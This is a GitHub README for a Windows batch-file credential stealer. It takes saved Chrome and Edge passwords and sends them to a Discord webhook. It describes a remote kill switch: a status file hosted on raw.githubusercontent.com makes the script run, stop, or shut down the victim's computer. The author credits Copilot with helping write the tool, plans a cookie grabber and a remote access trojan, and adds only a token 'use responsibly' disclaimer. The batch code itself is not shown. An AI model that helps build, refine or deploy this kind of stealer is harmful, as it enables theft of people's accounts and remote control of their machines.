# DW-Password-Grabber
DW stands for Discord Webhook. This is a Windows batch file, created with my assistance and a little help from Copilot, that can retrieve Chrome and Edge passwords and sends them to a discord server (the passwords that are sent are encrypted; I'm working on an automatic decryption tool). Please use it responsibly and for legal purposes only, have fun!

In future im making a roblox cookie grabber to and a R.A.T

 On line 6 replace YOUR_DISCORD_WEBHOOK_URL with you discord webhook

Now on line 5 there is a url this url https://raw.githubusercontent.com/ZDStudios/DW-Password-Grabber/refs/heads/main/allowed.txt   so i can control the bat script if you dont want that thats fine just replace the url with you're own and make sure it is 200 that means that the script run if its 199 then it will just stop exe3cuting the script if its 201 then it will shutdown the computer it ran on instantly.
